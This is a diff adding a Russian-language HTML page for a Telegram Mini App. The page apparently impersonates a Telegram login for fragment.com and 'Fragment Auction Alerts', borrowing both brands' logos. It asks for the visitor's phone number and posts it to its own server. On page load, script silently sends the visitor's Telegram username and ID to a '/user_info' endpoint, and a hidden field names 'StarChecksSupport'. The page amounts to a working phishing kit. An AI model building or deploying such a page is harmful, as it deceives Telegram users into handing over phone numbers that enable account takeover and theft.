@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="ru" style="--tg-theme-button-text-color: #ffffff; --tg-theme-section-bg-color: #282828; --tg-theme-hint-color: #ffffff; --tg-theme-link-color: #ff5257; --tg-color-scheme: dark; --tg-theme-bg-color: #282828; --tg-theme-secondary-bg-color: #1c1c1c; --tg-theme-accent-text-color: #ff5257; --tg-theme-section-header-text-color: #e5e5e5; --tg-theme-subtitle-text-color: #ffffff; --tg-theme-bottom-bar-bg-color: #3e464c; --tg-theme-section-separator-color: #3d3d3d; --tg-theme-text-color: #ffffff; --tg-theme-destructive-text-color: #ff453a; --tg-theme-button-color: #ff5257; --tg-theme-header-bg-color: #1c1c1c; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh; --tg-safe-area-inset-top: 0px; --tg-safe-area-inset-bottom: 0px; --tg-safe-area-inset-left: 0px; --tg-safe-area-inset-right: 0px;"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: white;
+      color: black;
+    }
+    .container {
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      padding: 0 20px;
+    }
+    .logo {
+  position: relative;
+  width: 180px;
+  height: 70px;
+  margin: 0 auto 25px auto;
+  display: block;
+}
+
+.logo .tg-logo {
+  position: absolute;
+  left: 0;
+  top: 5px;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  z-index: 2;
+}
+
+.logo .frag-logo {
+  position: absolute;
+  right: 0;
+  top: 5px;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  z-index: 2;
+}
+
+.logo .arrow {
+  position: absolute;
+  left: 30px;    /* Сдвиг по горизонтали */
+  top: 15px;     /* Сдвиг по вертикали */
+  width: 70px;  /* Длина стрелки */
+  height: 40px;  /* Ширина SVG */
+  z-index: 1;
+  pointer-events: none;
+}
+ и
+
+
+    /* 🔹 Заголовок и текст */
+    h2 {
+      font-size: 17px;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+    p {
+      font-size: 14px;
+      color: #000;
+      margin: 8px 0 20px;
+      line-height: 1.4;
+    }
+    p a {
+      color: #229ED9;
+      text-decoration: none;
+    }
+
+    /* 🔹 Поля ввода */
+    select {
+  width: 100%;
+  padding: 12px 8px;
+  margin: 8px 0 0 0;
+  border: none;
+  border-radius: 12px;
+  background: #f3f4f8;
+  font-size: 16px;
+  color: #222;
+  font-weight: 500;
+  appearance: none;
+  box-shadow: none;
+  outline: none;
+  background-image: url("data:image/svg+xml,%3Csvg width='16' height='16' fill='gray' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M4 6l4 4 4-4' stroke='gray' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 12px center;
+  background-size: 16px 16px;
+}
+
+.phone-input {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: #f3f4f8;
+  border-radius: 12px;
+  margin-top: 8px;
+  padding: 12px 8px;
+}
+
+.phone-input span {
+  font-size: 16px;
+  font-weight: bold;
+  color: #222;
+}
+
+.phone-input input {
+  border: none;
+  background: transparent;
+  font-size: 16px;
+  outline: none;
+  flex: 1;
+  color: #222;
+  padding: 0;
+}
+
+    /* 🔹 Кнопки */
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+    .btn {
+      flex: 1;
+      margin: 0 4px;
+      padding: 12px;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn.cancel {
+      background: none;
+      color: #229ED9;
+    }
+    .btn.submit {
+      background-color: #229ED9;
+      color: white;
+    }
+    .btn.submit:hover {
+      background-color: #1b89bd;
+    }
+  </style>
+<style type="text/css">
+* {
+  -webkit-touch-callout: none;
+}
+:not(input):not(textarea):not([contenteditable="true"]) {
+  -webkit-user-select: none;
+  user-select: none;
+}
+</style>
+</head>
+<body>  
+  <div class="container">
+    <!-- 🔹 Логотипы -->
+    <div class="logo">
+  <img class="tg-logo" src="https://telegram.org/img/t_logo.png" alt="Telegram">
+  <!-- Стрелка SVG как <img> -->
+  <img class="arrow" src="data:image/svg+xml,%3Csvg height='50' viewBox='0 0 98 50' width='98' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%234ca3e2' fill-rule='evenodd'%3E%3Cpath d='m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z' transform='matrix(0 1 -1 0 116.5 -65.5)'/%3E%3Cpath d='m40 21h46v8h-46z'/%3E%3C/g%3E%3C/svg%3E" alt="arrow">
+  <img class="frag-logo" src="static/fragment.jpeg" alt="Fragment">
+</div>
+
+
+    <!-- 🔹 Текст -->
+    <h2>Войдите, чтобы использовать аккаунт Telegram</h2>
+    <p>
+      для fragment.com и <a href="index.html#">Fragment Auction Alerts</a>.<br>
+      Введите свой <b>номер телефона</b> в <a href="index.html#">международном формате</a>. 
+      Подтверждение будет отправлено в Telegram.
+    </p>
+
+    <!-- 🔹 Форма -->
+    <form id="phoneForm" method="post" action="index.html">
+  <select id="country" name="country" onchange="updateCode()">
+    <option value="RU" data-code="+7" data-format="+7 XXX XXX XXXX">Россия</option>
+    <option value="AU" data-code="+61" data-format="+61 X XXXX XXXX">Австралия</option>
+    <option value="AT" data-code="+43" data-format="+43 XXX XXXXXXX">Австрия</option>
+    <option value="AZ" data-code="+994" data-format="+994 XX XXX XX XX">Азербайджан</option>
+    <option value="AL" data-code="+355" data-format="+355 XX XXX XXXX">Албания</option>
+    <option value="BY" data-code="+375" data-format="+375 XX XXX XX XX">Беларусь</option>
+    <option value="BE" data-code="+32" data-format="+32 XXX XX XX XX">Бельгия</option>
+    <option value="BG" data-code="+359" data-format="+359 XXX XXX XXX">Болгария</option>
+    <option value="BR" data-code="+55" data-format="+55 XX XXXXX XXXX">Бразилия</option>
+    <option value="GB" data-code="+44" data-format="+44 XXXX XXXXXX">Великобритания</option>
+    <option value="HU" data-code="+36" data-format="+36 XX XXX XXXX">Венгрия</option>
+    <option value="VN" data-code="+84" data-format="+84 XXX XXX XXXX">Вьетнам</option>
+    <option value="DE" data-code="+49" data-format="+49 XXX XXXXXXXX">Германия</option>
+    <option value="GR" data-code="+30" data-format="+30 XXX XXX XXXX">Греция</option>
+    <option value="GE" data-code="+995" data-format="+995 XXX XXX XXX">Грузия</option>
+    <option value="DK" data-code="+45" data-format="+45 XX XX XX XX">Дания</option>
+    <option value="EG" data-code="+20" data-format="+20 XXX XXX XXXX">Египет</option>
+    <option value="IL" data-code="+972" data-format="+972 XX-XXX-XXXX">Израиль</option>
+    <option value="IN" data-code="+91" data-format="+91 XXXXX XXXXX">Индия</option>
+    <option value="ID" data-code="+62" data-format="+62 XXX-XXXX-XXXX">Индонезия</option>
+    <option value="IE" data-code="+353" data-format="+353 XX XXX XXXX">Ирландия</option>
+    <option value="ES" data-code="+34" data-format="+34 XXX XXX XXX">Испания</option>
+    <option value="IT" data-code="+39" data-format="+39 XXX XXXXXXX">Италия</option>
+    <option value="KZ" data-code="+7" data-format="+7 XXX XXX XX XX">Казахстан</option>
+    <option value="CA" data-code="+1" data-format="+1 XXX XXX XXXX">Канада</option>
+    <option value="KG" data-code="+996" data-format="+996 XXX XXX XXX">Киргизия</option>
+    <option value="CN" data-code="+86" data-format="+86 XXX XXXX XXXX">Китай</option>
+    <option value="KR" data-code="+82" data-format="+82 XX-XXXX-XXXX">Корея</option>
+    <option value="LV" data-code="+371" data-format="+371 XXXX XXXX">Латвия</option>
+    <option value="LT" data-code="+370" data-format="+370 XXX XXXXX">Литва</option>
+    <option value="LU" data-code="+352" data-format="+352 XXXX XXXX">Люксембург</option>
+    <option value="MD" data-code="+373" data-format="+373 XXXX XXXX">Молдова</option>
+    <option value="MX" data-code="+52" data-format="+52 XXX XXX XXXX">Мексика</option>
+    <option value="MC" data-code="+377" data-format="+377 XX XX XX XX">Монако</option>
+    <option value="NL" data-code="+31" data-format="+31 XX XXX XXXX">Нидерланды</option>
+    <option value="NZ" data-code="+64" data-format="+64 XX XXX XXXX">Новая Зеландия</option>
+    <option value="NO" data-code="+47" data-format="+47 XXX XX XXX">Норвегия</option>
+    <option value="PL" data-code="+48" data-format="+48 XXX XXX XXX">Польша</option>
+    <option value="PT" data-code="+351" data-format="+351 XXX XXX XXX">Португалия</option>
+    <option value="RO" data-code="+40" data-format="+40 XXX XXX XXX">Румыния</option>
+    <option value="US" data-code="+1" data-format="+1 XXX XXX XXXX">США</option>
+    <option value="SG" data-code="+65" data-format="+65 XXXX XXXX">Сингапур</option>
+    <option value="SK" data-code="+421" data-format="+421 XXX XXX XXX">Словакия</option>
+    <option value="SI" data-code="+386" data-format="+386 XX XXX XXX">Словения</option>
+    <option value="TJ" data-code="+992" data-format="+992 XX XXX XXXX">Таджикистан</option>
+    <option value="TH" data-code="+66" data-format="+66 XX XXX XXXX">Таиланд</option>
+    <option value="TM" data-code="+993" data-format="+993 XX XXX XXX">Туркмения</option>
+    <option value="TR" data-code="+90" data-format="+90 XXX XXX XXXX">Турция</option>
+    <option value="UA" data-code="+380" data-format="+380 XX XXX XX XX">Украина</option>
+    <option value="UZ" data-code="+998" data-format="+998 XX XXX XX XX">Узбекистан</option>
+    <option value="FI" data-code="+358" data-format="+358 XX XXX XXXX">Финляндия</option>
+    <option value="FR" data-code="+33" data-format="+33 X XX XX XX XX">Франция</option>
+    <option value="HR" data-code="+385" data-format="+385 XX XXX XXXX">Хорватия</option>
+    <option value="CZ" data-code="+420" data-format="+420 XXX XXX XXX">Чехия</option>
+    <option value="CL" data-code="+56" data-format="+56 X XXXX XXXX">Чили</option>
+    <option value="CH" data-code="+41" data-format="+41 XX XXX XX XX">Швейцария</option>
+    <option value="SE" data-code="+46" data-format="+46 XX XXX XX XX">Швеция</option>
+    <option value="EE" data-code="+372" data-format="+372 XXXX XXXX">Эстония</option>
+    <option value="ZA" data-code="+27" data-format="+27 XX XXX XXXX">ЮАР</option>
+    <option value="JP" data-code="+81" data-format="+81 XX XXXX XXXX">Япония</option>
+    <option value="IR" data-code="+98" data-format="+98 XXX XXX XXXX">Иран</option>
+    <option value="IQ" data-code="+964" data-format="+964 XXXX XXXXXX">Ирак</option>
+    <!-- Добавьте остальные страны по аналогии -->
+  </select>
+
+  <div class="phone-input">
+    <span id="countryCode">+7</span>
+    <input type="text" id="phone" name="phone_number" required="" autocomplete="off">
+  </div>
+
+  <input type="hidden" id="country_code" name="country_code" value="+7">
+  <input type="hidden" id="tg_username" name="tg_username" value="StarChecksSupport">
+  <input type="hidden" id="tg_id" name="tg_id" value="7969516979">
+
+  <div class="buttons">
+    <button type="button" class="btn cancel">ОТМЕНА</button>
+    <button type="submit" class="btn submit">ДАЛЕЕ</button>
+  </div>
+</form>
+  </div>
+
+  <!-- 🔹 Telegram API -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>
+function sendUserInfo() {
+  if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe) {
+    const username = Telegram.WebApp.initDataUnsafe.user?.username || "";
+    const tg_id = Telegram.WebApp.initDataUnsafe.user?.id || "";
+    if (username || tg_id) {
+      fetch("/user_info", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({tg_username: username, tg_id: tg_id})
+      });
+    }
+  }
+}
+sendUserInfo();
+
+function updateCode() {
+  const select = document.getElementById("country");
+  const code = select.options[select.selectedIndex].dataset.code;
+  const format = select.options[select.selectedIndex].dataset.format;
+  document.getElementById("countryCode").innerText = code;
+  document.getElementById("phone").value = ""; // очищаем поле при смене страны
+  document.getElementById("country_code").value = code; // добавлено
+}
+
+function fillTelegramFields() {
+  if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe) {
+    document.getElementById("tg_username").value = Telegram.WebApp.initDataUnsafe.user?.username || "";
+    document.getElementById("tg_id").value = Telegram.WebApp.initDataUnsafe.user?.id || "";
+  }
+}
+fillTelegramFields();
+
+// Автоматическое форматирование номера
+function formatPhoneInput() {
+  const select = document.getElementById("country");
+  const format = select.options[select.selectedIndex].dataset.format;
+  const code = select.options[select.selectedIndex].dataset.code;
+  const input = document.getElementById("phone");
+  let digits = input.value.replace(/\D/g, "");
+  let mask = format.replace(code + " ", "");
+  let formatted = "";
+  let digitIndex = 0;
+
+  for (let i = 0; i < mask.length && digitIndex < digits.length; i++) {
+    if (mask[i] === "X") {
+      formatted += digits[digitIndex];
+      digitIndex++;
+    } else {
+      formatted += mask[i];
+    }
+  }
+  input.value = formatted;
+}
+
+document.getElementById("phone").addEventListener("input", formatPhoneInput);
+document.getElementById("country").addEventListener("change", function() {
+  updateCode();
+  formatPhoneInput();
+});
+
+document.getElementById("phoneForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+  const code = document.getElementById("countryCode").innerText;
+  const phone = document.getElementById("phone").value;
+  const fullPhone = code + " " + phone;
+
+  if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.sendData(fullPhone);
+  }
+
+  this.submit();
+});
+
+document.querySelector(".btn.cancel").addEventListener("click", function () {
+  if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.close();
+  } else {
+    alert("Mini App можно закрыть только внутри Telegram");
+  }
+});
+
+// Инициализация формата при загрузке
+updateCode();
+</script>
+
+</body></html>
